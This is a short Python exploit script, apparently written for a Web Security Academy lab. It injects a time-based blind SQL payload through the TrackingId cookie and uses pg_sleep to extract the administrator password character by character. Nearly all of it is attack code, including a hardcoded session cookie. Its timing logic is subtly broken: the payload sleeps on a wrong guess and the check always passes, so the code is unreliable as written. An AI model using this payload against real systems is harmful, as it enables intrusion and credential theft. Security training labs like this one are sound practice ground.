#!/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)


# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

main_url = 'https://0af900af03d340c9c0bf77d900bb0095.web-security-academy.net'
characters = string.ascii_lowercase + string.digits


def makeRequest():


    password = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:

            cookies = {

                    'TrackingId':f"1aRM03dq6xnXYgHQ'||(select case when substring(password,{position},1)='{character}' then pg_sleep(0) else pg_sleep(5) end from users where username='administrator')-- -",
                    'session': 'mF7sfzg9zSNrj8wHwQff71RCokb7R4br'
                    }
            
            p1.status(cookies['TrackingId'])
            
            time_start = time.time()

            r = requests.get(main_url, cookies=cookies)
            
            time_end = time.time()


            if time_end - time_start > 0:
                password += character
                p2.status(password)
                break


if __name__ == "__main__":

    makeRequest()
